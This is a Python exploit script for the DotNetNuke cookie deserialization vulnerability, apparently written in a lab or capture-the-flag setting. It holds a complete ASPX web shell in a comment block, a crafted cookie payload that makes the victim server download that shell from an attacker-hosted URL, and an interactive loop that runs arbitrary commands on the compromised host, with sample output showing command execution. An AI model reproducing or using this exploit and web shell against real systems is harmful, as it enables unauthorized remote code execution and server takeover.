#!/usr/bin/python3
import sys
import requests
from urllib.parse import urlparse
import readline
import re

# script to exploit the DotNetNuke cookie deserialization vulnerability
# usage
# 1. copy the file contents in the commented block below into a file, eg shell.aspx
# 2. run a python web server - python3 http.server 8080
# 3. execute this script - ./dnn_sploit http://attacker:8080/shell.aspx http://victim
#
# --- shell.aspx ---
# <%@ Page Language="C#" Debug="true" Trace="false" %>
# <%@ Import Namespace="System.Diagnostics" %>
# <%@ Import Namespace="System.IO" %>
# <script Language="c#" runat="server">
# void Page_Load(object sender, EventArgs e)
# {
# }
# string ExcuteCmd(string arg)
# {
# ProcessStartInfo psi = new ProcessStartInfo();
# psi.FileName = "cmd.exe";
# psi.Arguments = "/c "+arg;
# psi.RedirectStandardOutput = true;
# psi.UseShellExecute = false;
# Process p = Process.Start(psi);
# StreamReader stmrdr = p.StandardOutput;
# string s = stmrdr.ReadToEnd();
# stmrdr.Close();
# return s;
# }
# void cmdExe_Click(object sender, System.EventArgs e)
# {
# Response.Write("<pre>");
# Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
# Response.Write("</pre>");
# }
# </script>
# <HTML>
# <HEAD>
# <title>gimi</title>
# </HEAD>
# <body >
# <form id="cmd" method="post" runat="server">
# <asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
# <asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
# <asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
# </form>
# </body>
# </HTML>
# ---
# successful output
# ./dnn_sploit.py http://10.10.14.4:8080/likes.aspx http://10.10.110.10
# [+] Sending victim server, http://10.10.14.4:8080/likes.aspx, the upload URL: http://10.10.110.10
# shellurl: http://10.10.110.10/likes.aspx
# [+] Upload successful
# > whoami
# nt authority\network service


if len(sys.argv) != 3:
    print("./dnn_sploit.py <attacker url> <target url>")
    sys.exit(1)

atkurl = sys.argv[1]
vicurl = sys.argv[2]

print("[+] Sending victim server, {}, the upload URL: {}".format(atkurl,vicurl))

# parse out the URL's host
host = urlparse(vicurl).netloc

# build the web shell URL
path = urlparse(atkurl).path
shellurl = vicurl + path
print("shellurl: {}".format(shellurl))

# build upload file path
uploadpath = "C:\\dotnetnuke\\likes.aspx"

# Headers
headers = {
    'Host': host,
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
    'Cookie': '.DOTNETNUKE=;DNNPersonalization=<profile><item key="name1:key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">' + atkurl + '</anyType><anyType xsi:type="xsd:string">' + uploadpath + '</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>;',
    'Connection': 'close',
}

# Data
data = r''''''

# Cookies
cookies = {
}

# Prepare and send upload request
req = requests.Request(
    method='GET',
    url=vicurl + '/__',
    headers=headers,
    data=data,
    cookies=cookies,
)

prepared_req = req.prepare()
session = requests.Session()
resp = session.send(prepared_req)

# Prepare and send checker request
req2 = requests.Request(
    method='GET',
    url=shellurl,
)

prepared_req2 = req2.prepare()
session = requests.Session()
resp = session.send(prepared_req2)

if resp.status_code != 200:
    print("[!] Something went wrong")
    sys.exit(1)

print("[+] Upload successful")

def RunCmd (cmd,shellurl):

    host = urlparse(shellurl).netloc

    # Headers
    headers = {
        'Host': host,
        'User-Agent': 'curl/7.72.0',
        'Accept': '*/*',
        'Content-Length': '344',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close',
    }

    # Data
    data = r'''__VIEWSTATE=fmt01B%2F4FMHxX5x3jDwqDB53kUlUlWWf6zzCunR%2BJQft%2FUi1mLbjgwF8WXoQ85KNUorMjIojICl8zDTN2tm0l86lJ7z6QPpm%2FEinNA%3D%3D&__VIEWSTATEGENERATOR=DBE0DA6C&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=8rI7byKdBgr8gi2EdtuM1eoaM8U%2BgMcNPUaKtMe3lcVBZuL%2FwTgh5pSvby1gJVAASZC5KgfpT8Pi1ZQU8pJnrLzr9nKY8rWeRJGaBA7BThwsVi5D&txtArg={}&testing=excute'''.format(cmd)

    # Cookies
    cookies = {
    }

    # Prepare and send request
    req = requests.Request(
        method='POST',
        url=shellurl,
        headers=headers,
        data=data,
        cookies=cookies,
    )
    prepared_req = req.prepare()
    session = requests.Session()
    resp = session.send(prepared_req)

    result = re.search(r'<pre>.*?\n</pre>', resp.text, re.DOTALL).group().replace("<pre>","").replace("</pre>","")
    print(result)

while True:
    cmd = input('> ')
    if cmd == "exit" or cmd == "quit":
        sys.exit(0)

    RunCmd(cmd,shellurl)

